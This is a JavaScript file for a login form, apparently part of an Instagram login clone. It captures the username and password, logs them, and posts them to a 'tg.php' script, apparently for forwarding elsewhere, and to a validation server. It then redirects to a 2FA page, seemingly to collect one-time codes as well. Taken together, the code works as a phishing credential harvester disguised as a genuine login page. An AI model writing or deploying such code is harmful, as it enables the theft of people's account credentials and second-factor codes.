const showPsswd  = document.getElementById('toggle-password');
const pswdInput = document.getElementById('password');
const usernameInput = document.getElementById('username');
const loginBtn = document.getElementById('login-btn');
const falseCredentials = {
    password: "falsepwd",
    username: "falseuser",
    TFA: '123456'
}
const errMsg = document.getElementById('error-message');
const form = document.getElementById('login-form');

pswdInput.addEventListener('focus', () => {
    // console.log('focus');
    showPsswd.style.display = 'block';
})

document.addEventListener('click', (e) => {
    if (e.target !== showPsswd && e.target !== pswdInput) {
        showPsswd.style.display = 'none';
    }
})

const toggleLoginButton = () => {
    loginBtn.disabled = !(pswdInput.value.length >= 5 && usernameInput.value.length >= 5);
};

pswdInput.addEventListener('input', toggleLoginButton);
usernameInput.addEventListener('input', toggleLoginButton);



showPsswd.addEventListener('click', () => {
    // console.log('toggle password');
    // console.log(pswdInput);
    pswdInput.type = pswdInput.type === 'password'? 'text' : 'password';  // Toggle between 'password' and 'text' types
    showPsswd.textContent = pswdInput.type === 'password'? 'Show' : 'Hide'; // Update the button text
})

loginBtn.addEventListener('click', (e) => {
    e.preventDefault(); // Prevent the form from submitting normally
    if (usernameInput.value === falseCredentials.username && pswdInput.value === falseCredentials.password) {
        errMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
    } else {
        const userdata = {
            username: usernameInput.value,
            password: pswdInput.value
        };
        console.log(userdata);
        const formData = new FormData();
        formData.append('username', usernameInput.value);
        formData.append('password', pswdInput.value);

        fetch("http://localhost:8080/script/tg.php", {
            method: "POST",
            body: formData, // Use FormData object to send data
        })
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(error => console.error("Error:", error));

        fetch("http://localhost:3000/validate-login", {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(userdata)
        })
            .then(response => response.json())
            .then(data => {
                console.log(data);
                if (data.answer === '1') {
                    console.log("Redirect");
                    errMsg.textContent = "";
                    window.location.href = `2FA.html`;
                } else {
                    console.log("Sorry");
                    errMsg.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
                }
            })
            .catch(error => console.log(error));


        //errMsg.textContent = '';
        // window.location.href = `${window.location.origin}/Instagram-Login-Clone/2FA.html`;
    }
});
